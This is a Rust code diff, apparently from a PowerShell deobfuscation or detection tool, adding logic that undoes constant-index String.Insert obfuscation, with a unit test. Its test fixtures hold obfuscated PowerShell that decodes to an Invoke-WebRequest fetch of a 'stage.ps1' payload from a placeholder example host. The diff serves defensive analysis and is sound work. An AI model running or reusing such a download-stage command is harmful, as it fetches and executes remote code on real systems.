@@ -1055,6 +1055,14 @@ static PS_LITERAL_INSERT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_CONST_INSERT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Insert\s*\(\s*(\d{1,6})\s*,\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*\)"#,
+    )
+    .expect("ps literal const insert extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_STRING_CASE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*(ToLower|ToUpper)\s*\(\s*\)"#,
@@ -3640,6 +3648,30 @@ fn expand_literal_insert_extractor_calls(text: &str) -> String {
         };
         out = inline_ps_literal_insert_calls(&out, &name, binding);
     }
+    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
+        let Some(caps) = PS_LITERAL_CONST_INSERT_EXTRACTOR_BODY_RE.captures(&body) else {
+            continue;
+        };
+        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(start) = caps.get(2).and_then(|m| m.as_str().parse::<usize>().ok()) else {
+            continue;
+        };
+        let Some(insert) = caps
+            .get(3)
+            .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
+        else {
+            continue;
+        };
+        let param_index = parse_ps_function_param_indices(&params);
+        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+
+        out =
+            inline_ps_literal_const_insert_calls(&out, &name, value_idx, value_var, start, &insert);
+    }
     out
 }
 
@@ -4791,6 +4823,107 @@ struct PsInsertExtractorParamBinding<'a> {
     start_name: &'a str,
     insert_idx: usize,
     insert_name: &'a str,
+}
+
+fn inline_ps_literal_const_insert_calls(
+    text: &str,
+    name: &str,
+    value_idx: usize,
+    value_name: &str,
+    start: usize,
+    insert: &str,
+) -> String {
+    let lower = text.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut match_count = 0;
+
+    for needle in needles {
+        let mut search_from = 0;
+        while match_count < 128 {
+            let Some(rel) = lower[search_from..].find(&needle) else {
+                break;
+            };
+            let call_start = search_from + rel;
+            let end_name = call_start + needle.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+            else {
+                search_from = end_name;
+                continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
+            }
+            if bytes.get(pos) == Some(&b'-') {
+                if let Some((call_end, replacement)) = inline_ps_named_literal_const_insert_call(
+                    text,
+                    pos,
+                    parenthesized,
+                    value_name,
+                    start,
+                    insert,
+                ) {
+                    matches.push((replace_start, call_end, replacement));
+                    search_from = call_end;
+                    match_count += 1;
+                    continue;
+                }
+            }
+            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+                search_from = end_name;
+                continue;
+            };
+            let mut call_end = value_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = call_end;
+                    continue;
+                }
+                call_end = after + 1;
+            }
+            if value_idx != 0 {
+                search_from = call_end;
+                continue;
+            }
+            let Some(replacement) = ps_literal_insert_replacement(&value, start, insert) else {
+                search_from = call_end;
+                continue;
+            };
+            matches.push((replace_start, call_end, replacement));
+            search_from = call_end;
+            match_count += 1;
+        }
+    }
+
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+fn inline_ps_named_literal_const_insert_call(
+    text: &str,
+    pos: usize,
+    parenthesized: bool,
+    value_name: &str,
+    start: usize,
+    insert: &str,
+) -> Option<(usize, String)> {
+    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
+    let value = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
+        .1
+        .as_str();
+    Some((
+        call_end,
+        ps_literal_insert_replacement(value, start, insert)?,
+    ))
 }
 
 fn inline_ps_literal_insert_calls(
@@ -9139,6 +9272,22 @@ Add 'InvokeWebRequest -Uri https://ps-insert-extractor.example/stage.ps1' 6 '-'"
         assert!(
             out.contains(&format!("'{decoded}'")),
             "literal insert extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_constant_insert_extractor_call_is_rewritten() {
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-insert-extractor.example/stage.ps1";
+        let text = r#"function Add($value) {
+  return $value.Insert(6,'-')
+}
+Add 'InvokeWebRequest -Uri https://ps-const-insert-extractor.example/stage.ps1'"#;
+
+        let out = expand_literal_insert_extractor_calls(text);
+
+        assert!(
+            out.contains(&format!("'{decoded}'")),
+            "literal constant insert extractor call was not rewritten:\n{out}"
         );
     }
 
